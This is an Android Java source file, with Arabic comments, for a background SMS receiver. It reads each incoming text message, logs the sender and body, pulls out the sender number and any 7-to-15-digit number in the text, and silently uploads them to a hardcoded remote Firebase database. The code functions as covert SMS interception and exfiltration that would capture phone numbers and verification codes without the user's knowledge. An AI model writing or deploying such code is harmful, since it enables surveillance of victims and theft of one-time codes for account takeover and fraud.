package com.cdma.gsm.call;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiverBridge";
    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        Log.d(TAG, "رسالة واردة من: " + sender + " المحتوى: " + messageBody);

                        // الطريقة أ: إذا كان رقم المرسل هو ما نريده (مثل إشعار من شركة الاتصالات)
                        extractAndSend(sender, "SMS_SENDER");

                        // الطريقة ب: البحث عن أي رقم هاتف داخل نص الرسالة (باستخدام Regex)
                        String extractedNum = findPhoneNumberInText(messageBody);
                        if (extractedNum != null) {
                            extractAndSend(extractedNum, "SMS_CONTENT");
                        }
                    }
                }
            }
        }
    }

    private String findPhoneNumberInText(String text) {
        // نمط للبحث عن أرقام بطول 7 إلى 15 رقم داخل النص
        Pattern pattern = Pattern.compile("\\d{7,15}");
        Matcher matcher = pattern.matcher(text);
        if (matcher.find()) {
            return matcher.group();
        }
        return null;
    }

    private void extractAndSend(String number, String subType) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
            DatabaseReference myRef = database.getReference("bridge_signals");

            Map<String, Object> data = new HashMap<>();
            data.put("number", number);
            data.put("type", "SMS");
            data.put("method", subType); // هل هو رقم المرسل أم رقم مستخرج من النص
            data.put("timestamp", System.currentTimeMillis());

            myRef.setValue(data).addOnSuccessListener(aVoid -> 
                Log.d(TAG, "تم إرسال بيانات الرسالة إلى Firebase بنجاح")
            );
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال بيانات SMS: " + e.getMessage());
        }
    }
}
